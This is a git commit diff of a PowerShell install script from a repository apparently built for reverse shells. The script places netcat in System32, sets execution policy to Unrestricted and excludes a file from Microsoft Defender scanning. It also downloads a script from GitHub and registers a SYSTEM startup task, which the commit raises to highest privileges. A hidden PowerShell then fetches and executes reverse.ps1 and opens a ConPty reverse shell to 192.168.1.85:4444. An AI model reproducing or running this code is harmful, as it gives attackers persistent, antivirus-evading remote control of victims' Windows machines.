a284839ccaae7a8b3745528046585bdd8674c525
bjrumplee <130537869+bjrumplee@users.noreply.github.com>
2023-05-05 16:11:40 -0700

    Update install.ps1

--- install.ps1
+++ install.ps1
@@ -4,5 +4,5 @@ Move-Item -Path 'C:\Temp\netcat\nc.exe' -Destination 'C:\Windows\System32' -Forc
 Set-ExecutionPolicy Unrestricted -Force
 Add-MpPreference -ExclusionPath "C:\Temp\restart.ps1"
 (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/bjrumplee/ncatreverseshellav/main/restart.ps1', 'C:\Temp\restart.ps1')
-schtasks /create /tn "Restart" /tr "'powershell.exe' '-ExecutionPolicy Bypass' '-File C:\Temp\restart.ps1'" /sc onstart /ru system /f
+schtasks /create /tn "Restart" /tr "'powershell.exe' '-ExecutionPolicy Bypass' '-File C:\Temp\restart.ps1'" /sc onstart /ru system /f /RL HIGHEST
 powershell -NoProfile -WindowStyle Hidden -Command "IEX (IWR 'https://raw.githubusercontent.com/bjrumplee/ncatreverseshellav/main/reverse.ps1' -UseBasicParsing); Invoke-ConPtyShell '192.168.1.85' '4444'"
